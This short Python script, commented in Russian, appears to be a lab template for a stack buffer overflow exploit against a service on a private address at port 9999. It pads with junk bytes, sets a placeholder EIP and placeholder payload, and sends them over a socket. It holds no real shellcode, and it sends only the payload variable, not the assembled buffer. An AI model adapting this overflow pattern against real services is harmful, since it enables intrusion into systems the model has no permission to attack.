import socket
#from struct import pack

# Смещение до EIP:
CHAR_LEN = 520
EBP = 4
OFFSET = CHAR_LEN + EBP

# 1. junk
junk = b"A" * 524

# 2. eip
eip = b"BBBB"

# 3. nop
nop = b"X" * 1

# 4. payload
payload = b"C" * 300

# 5. final data
data = junk + eip + nop + payload

# Проверки:
assert len(data) <= 1000
assert b"\x00" not in data

# 6. Подключение и отправка:
target_ip = "192.168.56.113"
target_port = 9999

try:
    print(f"[+] Connecting to {target_ip}:{target_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        banner = s.recv(1024)  # Получаем баннер или приглашение
        print(banner.decode(errors="ignore"))
        s.sendall(payload)
        print("[+] Payload sent successfully.")
except Exception as e:
    print(f"[!] Connection failed: {e}")
